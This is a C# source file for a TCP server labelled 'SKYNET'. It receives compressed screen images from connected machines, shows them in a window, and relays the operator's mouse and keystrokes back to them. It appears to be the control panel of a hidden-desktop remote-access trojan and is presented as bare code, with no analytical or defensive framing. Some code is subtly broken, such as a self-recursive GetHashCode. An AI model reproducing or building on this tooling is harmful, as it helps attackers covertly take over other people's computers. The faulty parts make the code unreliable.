using System;
using System.Drawing;
using System.Globalization;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Engine.Metafora_Dedomenon
{


    public class Server
    {
        private const string gc_magik = "SKYNET\0";
        private const int gc_sleepNotRecvPixels = 0x21;
        private static long Counter = 0L;
        private static readonly Color TransparentColor = Color.FromArgb(0xff, 0xae, 0xc9);
        internal static byte[] latestBytes = null;
        internal int ImageWidth;
        internal int ImageHeight;
        internal static IntPtr hParentWnd = IntPtr.Zero;
        internal static Control parentControl = null;
        internal int port;
        internal bool stopped = true;
        internal static Client[] g_clients = new Client[0x100];
        internal TcpListener listener;
        private const int GWL_WNDPROC = -4;
        private const int VK_LBUTTON = 1;
        private const int VK_RBUTTON = 2;
        private const int VK_CANCEL = 3;
        private const int VK_MBUTTON = 4;
        private const int VK_BACK = 8;
        private const int VK_RETURN = 13;
        private const int VK_PRIOR = 0x21;
        private const int VK_NEXT = 0x22;
        private const int VK_END = 0x23;
        private const int VK_HOME = 0x24;
        private const int VK_LEFT = 0x25;
        private const int VK_UP = 0x26;
        private const int VK_RIGHT = 0x27;
        private const int VK_DOWN = 40;
        private const int VK_SELECT = 0x29;
        private const int VK_PRINT = 0x2a;
        private const int VK_EXECUTE = 0x2b;
        private const int VK_SNAPSHOT = 0x2c;
        private const int VK_INSERT = 0x2d;
        private const int VK_DELETE = 0x2e;
        private const int VK_HELP = 0x2f;
        private const int WM_KEYDOWN = 0x100;
        private const int WM_KEYUP = 0x101;
        private const int WM_CHAR = 0x102;
        private const int WM_MOUSEMOVE = 0x200;
        private const int WM_LBUTTONDOWN = 0x201;
        private const int WM_LBUTTONUP = 0x202;
        private const int WM_LBUTTONDBLCLK = 0x203;
        private const int WM_RBUTTONDOWN = 0x204;
        private const int WM_RBUTTONUP = 0x205;
        private const int WM_RBUTTONDBLCLK = 0x206;
        private const int WM_MBUTTONDOWN = 0x207;
        private const int WM_MBUTTONUP = 520;
        private const int WM_MBUTTONDBLCLK = 0x209;
        private const int WM_MOUSEWHEEL = 0x20a;
        public DisconnectedClientEvent OnDisconnected;
        public ConnectedClientEvent OnConnected;
        private static WinProc newWndProc = null;
        private static IntPtr oldWndProc = IntPtr.Zero;

        [DllImport("user32.dll")]
        private static extern IntPtr CallWindowProc(IntPtr lpPrevWndFunc, IntPtr hWnd, uint Msg, int wParam, int lParam);
        private void ClientThreadProc(object parameter)
        {
            TcpClient client = (TcpClient) parameter;
            long address = ((IPEndPoint) client.Client.RemoteEndPoint).Address.Address;
            byte[] buffer = new byte[0x400];
            int length = client.GetStream().Read(buffer, 0, "SKYNET\0".Length);
            for (int i = 0; i < "SKYNET\0".Length; i++)
            {
                if (buffer[i] != "SKYNET\0"[i])
                {
                    byte[] destinationArray = new byte[length];
                    Array.Copy(buffer, 0, destinationArray, 0, length);
                    client.GetStream().Close();
                    client.Close();
                    return;
                }
            }
            if (client.GetStream().Read(buffer, 0, 4) <= 0)
            {
                client.GetStream().Close();
                client.Close();
            }
            else
            {
                Client[] clientArray;
                switch (BitConverter.ToInt32(buffer, 0))
                {
                    case 0:
                    {
                        Client clientDesc = GetClient((IntPtr) address, true);
                        clientDesc.desktopClient = client;
                        bool flag = false;
                        while (!this.IsStopped() && !flag)
                        {
                            Thread.Sleep(0);
                            RECT lpRect = new RECT();
                            GetClientRect(hParentWnd, ref lpRect);
                            int num5 = ((lpRect.Right > clientDesc.screenWidth) && (clientDesc.screenWidth > 0)) ? clientDesc.screenWidth : lpRect.Right;
                            int num6 = ((lpRect.Bottom > clientDesc.screenHeight) && (clientDesc.screenHeight > 0)) ? clientDesc.screenHeight : lpRect.Bottom;
                            if (((num5 * 3) % 4) != 0)
                            {
                                num5 += (num5 * 3) % 4;
                            }
                            if (num5 == 0)
                            {
                            }
                            if (SendInt(client, (long) num5, 4) <= 0)
                            {
                                flag = true;
                            }
                            else
                            {
                                if (SendInt(client, (long) num6, 4) <= 0)
                                {
                                    flag = true;
                                    continue;
                                }
                                if (client.GetStream().Read(buffer, 0, 4) <= 0)
                                {
                                    flag = true;
                                    continue;
                                }
                                if (buffer[0] <= 0)
                                {
                                    Thread.Sleep(0x21);
                                    continue;
                                }
                                if (client.GetStream().Read(buffer, 0, 4) <= 0)
                                {
                                    flag = true;
                                    continue;
                                }
                                clientDesc.screenWidth = BitConverter.ToInt32(buffer, 0);
                                if (client.GetStream().Read(buffer, 0, 4) <= 0)
                                {
                                    flag = true;
                                    continue;
                                }
                                clientDesc.screenHeight = BitConverter.ToInt32(buffer, 0);
                                if (client.GetStream().Read(buffer, 0, 4) <= 0)
                                {
                                    flag = true;
                                    continue;
                                }
                                int num7 = BitConverter.ToInt32(buffer, 0);
                                if (client.GetStream().Read(buffer, 0, 4) <= 0)
                                {
                                    flag = true;
                                    continue;
                                }
                                int num8 = BitConverter.ToInt32(buffer, 0);
                                if (client.GetStream().Read(buffer, 0, 4) <= 0)
                                {
                                    flag = true;
                                    continue;
                                }
                                length = BitConverter.ToInt32(buffer, 0);
                                byte[] destinationArray = new byte[length];
                                int destinationIndex = 0;
                                do
                                {
                                    int count = Math.Min(buffer.Length, length - destinationIndex);
                                    int num13 = client.GetStream().Read(buffer, 0, count);
                                    if (num13 <= 0)
                                    {
                                        flag = true;
                                    }
                                    else
                                    {
                                        Array.Copy(buffer, 0, destinationArray, destinationIndex, num13);
                                        destinationIndex += num13;
                                    }
                                }
                                while (destinationIndex != length);
                                uint finalUncompressedSize = (uint) length;
                                int cb = (num7 * 3) * num8;
                                byte[] destination = new byte[cb];
                                IntPtr uncompressedBuffer = Marshal.AllocHGlobal(cb);
                                IntPtr ptr2 = Marshal.AllocHGlobal(length);
                                Marshal.Copy(destinationArray, 0, ptr2, destinationIndex);
                                RtlDecompressBuffer(2, uncompressedBuffer, (uint) cb, ptr2, (uint) length, out finalUncompressedSize);
                                Marshal.Copy(uncompressedBuffer, destination, 0, (int) finalUncompressedSize);
                                Marshal.FreeHGlobal(ptr2);
                                if (clientDesc.pixelsWidth == num7)
                                {
                                    int pixelsHeight = clientDesc.pixelsHeight;
                                }
                                if (clientDesc.pixels == null)
                                {
                                    clientDesc.pixels = destination;
                                }
                                else
                                {
                                    for (int j = 0; j < cb; j += 3)
                                    {
                                        if (((destination[j] != TransparentColor.R) || (destination[j + 1] != TransparentColor.G)) || (destination[j + 2] != TransparentColor.B))
                                        {
                                            clientDesc.pixels[j] = destination[j];
                                            clientDesc.pixels[j + 1] = destination[j + 1];
                                            clientDesc.pixels[j + 2] = destination[j + 2];
                                        }
                                    }
                                    destination = null;
                                }
                                GC.Collect(2);
                                clientArray = g_clients;
                                lock (clientArray)
                                {
                                    this.ImageWidth = num7;
                                    this.ImageHeight = num8;
                                    latestBytes = clientDesc.pixels;
                                }
                                parentControl.Invalidate();
                                Marshal.FreeHGlobal(uncompressedBuffer);
                                if (SendInt(client, 0L, 4) <= 0)
                                {
                                    flag = true;
                                }
                            }
                        }
                        Disconnect(clientDesc);
                        break;
                    }
                    case 1:
                    {
                        if (this.OnConnected != null)
                        {
                            this.OnConnected(this, (int) address);
                        }
                        Client client3 = GetClient((IntPtr) address, true);
                        clientArray = g_clients;
                        lock (clientArray)
                        {
                            if (client3 != null)
                            {
                                return;
                            }
                            bool flag3 = false;
                            for (int j = 0; j < g_clients.Length; j++)
                            {
                                if (g_clients[j].hWnd.ToInt64() == 0)
                                {
                                    flag3 = true;
                                    client3 = g_clients[j];
                                }
                            }
                            if (!flag3)
                            {
                                return;
                            }
                            client3.hWnd = hParentWnd;
                            client3.uhid = address;
                            client3.inputClient = client;
                            client3.minEvent = new ManualResetEvent(false);
                            SendClientInput(client, 0x401, 0L, 0L);
                        }
                        SendInt(client, 0L, 4);
                        break;
                    }
                }
            }
        }

        [DllImport("user32.dll")]
        private static extern IntPtr DefWindowProc(IntPtr hWnd, uint uMsg, int wParam, int lParam);
        private static void Disconnect(Client clientDesc)
        {
            long uhid = clientDesc.uhid;
            if (clientDesc.desktopClient.Connected)
            {
                clientDesc.desktopClient.GetStream().Close();
                clientDesc.desktopClient.Close();
            }
            if (clientDesc.inputClient.Connected)
            {
                clientDesc.inputClient.GetStream().Close();
                clientDesc.inputClient.Close();
            }
            clientDesc.inputClient = null;
            clientDesc.desktopClient = null;
            IntPtr hWnd = clientDesc.hWnd;
            clientDesc.hWnd = IntPtr.Zero;
            if (clientDesc.Bitmap != null)
            {
                clientDesc.Bitmap.Dispose();
                clientDesc.Bitmap = null;
            }
            if (clientDesc.pixels != null)
            {
                clientDesc.pixels = null;
            }
            clientDesc.uhid = 0L;
            latestBytes = null;
            parentControl.Invalidate();
            Server server = (Server) clientDesc.Server;
            if (server.OnDisconnected != null)
            {
                server.OnDisconnected(clientDesc.Server, (int) uhid);
            }
        }

        private static Client GetClient(IntPtr data, bool uhid)
        {
            for (int i = 0; i < g_clients.Length; i++)
            {
                if (uhid)
                {
                    if (g_clients[i].uhid == data.ToInt64())
                    {
                        return g_clients[i];
                    }
                }
                else if (g_clients[i].hWnd == data)
                {
                    return g_clients[i];
                }
            }
            return null;
        }

        [DllImport("user32.dll")]
        private static extern bool GetClientRect(IntPtr hWnd, ref RECT lpRect);
        public byte[] GetDesktopImageBytes()
        {
            Client[] clientArray = g_clients;
            lock (clientArray)
            {
                return latestBytes;
            }
        }

        [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
        private static extern short GetKeyState(int keyCode);
        private static Point GetPoint(IntPtr _xy)
        {
            uint num1 = (IntPtr.Size == 8) ? ((uint) _xy.ToInt64()) : ((uint) _xy.ToInt32());
            int x = (short) num1;
            return new Point(x, (short) (num1 >> 0x10));
        }

        [DllImport("user32.dll")]
        private static extern WinProc GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")]
        private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        public bool IsStopped()
        {
            Client[] clientArray = g_clients;
            lock (clientArray)
            {
                return this.stopped;
            }
        }

        private void ListeningThreadProc()
        {
            this.listener.Start();
            while (!this.IsStopped())
            {
                if (this.listener.Pending())
                {
                    TcpClient parameter = this.listener.AcceptTcpClient();
                    new Thread(new ParameterizedThreadStart(this.ClientThreadProc)).Start(parameter);
                }
            }
        }

        private static long MAKELPARAM(long wLow, long wHigh) => 
            (wLow & 0xffffL) | ((wHigh & 0xffffL) << 0x10);

        private static IntPtr NewWndProc(IntPtr hWnd, uint msg, int wParam, int lParam)
        {
            Client[] clientArray;
            Client clientDesc = GetClient(hWnd, false);
            if ((msg - 0x100) > 1)
            {
                if (msg != 0x102)
                {
                    if ((((msg - 0x200) > 10) || ((msg == 0x200) && (GetKeyState(1) >= 0))) || (clientDesc == null))
                    {
                        goto Label_01B1;
                    }
                    RECT lpRect = new RECT();
                    Point point = GetPoint((IntPtr) lParam);
                    GetClientRect(hWnd, ref lpRect);
                    float num = ((float) clientDesc.screenWidth) / ((float) lpRect.Right);
                    float num2 = ((float) clientDesc.screenHeight) / ((float) lpRect.Bottom);
                    long wHigh = (long) (point.Y * num2);
                    lParam = (int) MAKELPARAM((long) (point.X * num), wHigh);
                    clientArray = g_clients;
                    lock (clientArray)
                    {
                        if (!SendClientInput(clientDesc.inputClient, msg, (long) wParam, (long) lParam))
                        {
                            Disconnect(clientDesc);
                        }
                        goto Label_01B1;
                    }
                }
                if ((clientDesc == null) || (((wParam == 0x7f) || ((wParam >= 0) && (wParam <= 0x1f))) && (wParam != 13)))
                {
                    goto Label_01B1;
                }
                clientArray = g_clients;
                lock (clientArray)
                {
                    if (!SendClientInput(clientDesc.inputClient, msg, (long) wParam, (long) lParam))
                    {
                        Disconnect(clientDesc);
                    }
                    goto Label_01B1;
                }
            }
            if (((((wParam == 0x26) || (wParam == 40)) || ((wParam == 0x27) || (wParam == 0x25))) || (((wParam == 0x24) || (wParam == 0x23)) || ((wParam == 0x21) || (wParam == 0x22)))) || (((wParam == 0x2d) || (wParam == 13)) || ((wParam == 0x2e) || (wParam == 8))))
            {
                clientArray = g_clients;
                lock (clientArray)
                {
                    if (!SendClientInput(clientDesc.inputClient, msg, (long) wParam, (long) lParam))
                    {
                        Disconnect(clientDesc);
                    }
                }
            }
        Label_01B1:
            return CallWindowProc(oldWndProc, hWnd, msg, wParam, lParam);
        }

        [DllImport("ntdll.dll")]
        private static extern int RtlCompressBuffer(ushort formatAndEngine, IntPtr uncompressedBuffer, uint uncompressedBufferSize, IntPtr compressedBuffer, uint compressedBufferSize, uint uncompressedChunkSize, out uint finalCompressedSize, IntPtr workspace);
        [DllImport("ntdll.dll")]
        private static extern int RtlDecompressBuffer(ushort formatAndEngine, IntPtr uncompressedBuffer, uint uncompressedBufferSize, IntPtr compressedBuffer, uint compressedBufferSize, out uint finalUncompressedSize);
        public void Send(uint msg, long wparam, long lparam)
        {
            for (int i = 0; i < g_clients.Length; i++)
            {
                if (g_clients[i].hWnd != IntPtr.Zero)
                {
                    SendClientInput(g_clients[i].inputClient, msg, wparam, lparam);
                }
            }
        }

        private static bool SendClientInput(TcpClient client, uint msg, long wParam, long lParam)
        {
            if (SendInt(client, (long) msg, 4) <= 0)
            {
                return false;
            }
            if (SendInt(client, wParam, IntPtr.Size) <= 0)
            {
                return false;
            }
            if (SendInt(client, lParam, IntPtr.Size) <= 0)
            {
                return false;
            }
            return true;
        }

        private static int SendInt(TcpClient client, long i, int size)
        {
            byte[] bytes = BitConverter.GetBytes(i);
            try
            {
                client.GetStream().Write(bytes, 0, size);
                return size;
            }
            catch (Exception)
            {
                return 0;
            }
        }

        public void SetParentWindow(Control control)
        {
            if (hParentWnd == IntPtr.Zero)
            {
                hParentWnd = control.Handle;
                parentControl = control;
                newWndProc = new WinProc(Server.NewWndProc);
                oldWndProc = SetWindowLong(control.Handle, -4, newWndProc);
            }
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowLong(IntPtr hWnd, int nIndex, WinProc newProc);
        public bool StartServer(int port)
        {
            if (this.port == 0)
            {
                this.port = port;
                this.stopped = false;
                for (int i = 0; i < g_clients.Length; i++)
                {
                    if (g_clients[i] == null)
                    {
                        g_clients[i] = new Client();
                        g_clients[i].Server = this;
                    }
                }
                this.listener = new TcpListener(IPAddress.Any, port);
                new Thread(new ThreadStart(this.ListeningThreadProc)).Start();
            }
            return false;
        }

        public bool StopServer()
        {
            Client[] clientArray = g_clients;
            lock (clientArray)
            {
                if (!this.stopped)
                {
                    if (this.listener != null)
                    {
                        this.listener.Stop();
                    }
                    hParentWnd = IntPtr.Zero;
                    this.stopped = true;
                    this.port = 0;
                }
            }
            return this.stopped;
        }

        public delegate void ConnectedClientEvent(object sender, int address);

        public delegate void DisconnectedClientEvent(object sender, int address);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
            public RECT(int left, int top, int right, int bottom)
            {
                this.Left = left;
                this.Top = top;
                this.Right = right;
                this.Bottom = bottom;
            }

            public RECT(Rectangle r) : this(r.Left, r.Top, r.Right, r.Bottom)
            {
            }

            public int X
            {
                get => 
                    this.Left;
                set
                {
                    this.Right -= this.Left - value;
                    this.Left = value;
                }
            }
            public int Y
            {
                get => 
                    this.Top;
                set
                {
                    this.Bottom -= this.Top - value;
                    this.Top = value;
                }
            }
            public int Height
            {
                get => 
                    this.Bottom - this.Top;
                set => 
                    this.Bottom = value + this.Top;
            }
            public int Width
            {
                get => 
                    this.Right - this.Left;
                set => 
                    this.Right = value + this.Left;
            }
            public Point Location
            {
                get => 
                    new Point(this.Left, this.Top);
                set
                {
                    this.X = value.X;
                    this.Y = value.Y;
                }
            }
            public System.Drawing.Size Size
            {
                get => 
                    new System.Drawing.Size(this.Width, this.Height);
                set
                {
                    this.Width = value.Width;
                    this.Height = value.Height;
                }
            }
            public static implicit operator Rectangle(Server.RECT r) => 
                new Rectangle(r.Left, r.Top, r.Width, r.Height);

            public static implicit operator Server.RECT(Rectangle r) => 
                new Server.RECT(r);

            public static bool operator ==(Server.RECT r1, Server.RECT r2) => 
                r1.Equals(r2);

            public static bool operator !=(Server.RECT r1, Server.RECT r2) => 
                !r1.Equals(r2);

            public bool Equals(Server.RECT r) => 
                (((r.Left == this.Left) && (r.Top == this.Top)) && (r.Right == this.Right)) && (r.Bottom == this.Bottom);

            public override bool Equals(object obj)
            {
                if (obj is Server.RECT)
                {
                    return this.Equals((Server.RECT) obj);
                }
                return ((obj is Rectangle) && this.Equals(new Server.RECT((Rectangle) obj)));
            }

            public override int GetHashCode()
            {
                return this.GetHashCode();
            }

            public override string ToString()
            {
                object[] args = new object[] { this.Left, this.Top, this.Right, this.Bottom };
                return string.Format(CultureInfo.CurrentCulture, "{{Left={0},Top={1},Right={2},Bottom={3}}}", args);
            }
        }

        private delegate IntPtr WinProc(IntPtr hWnd, uint Msg, int wParam, int lParam);
    }
}